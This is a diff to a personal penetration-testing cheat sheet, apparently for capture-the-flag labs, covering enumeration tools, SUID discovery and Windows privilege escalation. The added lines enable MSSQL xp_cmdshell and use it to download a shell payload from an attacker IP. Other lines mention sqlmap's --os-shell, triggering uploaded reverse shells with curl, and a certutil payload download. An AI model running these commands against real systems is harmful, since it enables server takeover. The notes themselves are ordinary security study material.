@@ -1,5 +1,4 @@
 
-
 Things to think about when stuck:
     
     Don't know what to do next:
@@ -52,6 +51,9 @@ Enumeration:
         gobuster - For bruteforcing directories and files on a webserver
         dirbuster - For bruteforcing directories and files on a webserver
         hydra - For bruteforcing usernames and passwords on ssh, http, https, etc.
+        john(john the ripper) - Password cracking from all sorts of formats such a zip, sha256, md5, etc.
+        sqlmap - Spams all sorts of different sql attacks to (including blind) to try and get the database.
+            * Can be used to gain a shell with --os-shell if it is PostGRES. 
 
         If you have a password that isn't working, but the password has a date/season/year in it, maybe try the current year?
 
@@ -136,6 +138,8 @@ Priviledge Escalation:
 
 Unix Helpers:
 
+    strings - Can be used to find special keywords and printable characters in a binary file EVEN while being executed to see what the executable binary is actually doing.
+
     "sed -i -e 's/\r$//' scriptname.sh" - Windows will have these stupid fucking line endings in their text files, so you can do a "Stream Editor" call to fix the file -i inplace with an -e expression.
 
     tee - for piping input and output easily
@@ -145,6 +149,7 @@ Unix Helpers:
     whoami - See the currnet user's username
 
     curl (client URL) - Allow arbitrary sending of http requests
+        ** THIS CAN TRIGGER A REVERSE SHELL IF YOU POINT IT AT AN UPLOADED REVERSE SHELL FILE ON A WEBSITE!!!!!!! **
 
     cat - Show the contents of a file
 
@@ -169,7 +174,11 @@ Unix Helpers:
 
     ls -la /etc/passwd - List priviledges from passwd.
 
-    find / -perm -u=s -type f 2>/dev/null - Find SUID files in a linux filesystem for privesc. Read man for details : "You must specify `u', `g' or `o' if you use a symbolic mode."
+    find - Allows you to search the filesystem starting at some directory with specified attributes
+
+        * find / -perm -u=s -type f 2>/dev/null - Find SUID files in a linux filesystem for privesc. Read man for details : "You must specify `u', `g' or `o' if you use a symbolic mode."
+
+        * find / -type f -group somegroup - Find all files that belong to a certain group (can be run by those group members)
 
     lsb_release -a (linux standard base) - Shows short title information about linux distro
     and linux version.
@@ -196,6 +205,19 @@ Nmap commands:
 ---------------------------------------------------------------------------------
 
 Windows Powershell (WTF)
+    
+    MSSQL Command Bullshit (MSSQL is super-fucky and does not work with the commands below in PrivEsc watch out and use these!)
+        First do this to configure the fuckery that is mssql:
+
+			*EXEC sp_configure 'Show Advanced Options', 1;
+			*reconfigure;
+			*sp_configure;
+			*EXEC sp_configure 'xp_cmdshell', 1
+			*reconfigure;
+			*xp_cmdshell "whoami"
+
+        - xp_cmdshell "powershell wget -UseBasicParsing http://10.10.14.9:9001/powershell.ps1 -OutFile %temp%/shell.exe"
+        
 
     PrivEsc:
 
@@ -207,7 +229,6 @@ Windows Powershell (WTF)
             - Make sure you are in a world-writable directory such as C://Windows/Temp/
         
         certutil - Although it is used for fetching certificates, it can be used for fetching any arbitrary file, including executables. 
-            - ie. "certutil -urlcache -f http://10.10.x.x/somefile.exe shell.exe
 
         sherlock.ps1 - AutoEnumeration of known exploits
             - ie. certutil -urlcache -f http://10.10.10.x/sherlock.ps1 sherlock.ps1
@@ -219,7 +240,7 @@ Windows Powershell (WTF)
         - migrate -> to migrate to a more stable user in higher position.
             * Certain metasploit exploits WILL NOT WORK WITHOUT A STABLE PROCESS/USER.
 
-    Meterprete PrivEsc:
+    Meterpreter PrivEsc:
         - Remeber that sometimes getting another reverse shell with metasploit once you have a session can give you a shell with higher priviledges as NT AUTHORITY/SYSTEM instead of whatever you had earlier.
         - Try looking for a service that has an authority to migrate to. Then background the process and then try to use 
         the windows exploit suggestor by searching "suggester" in metasploit. 
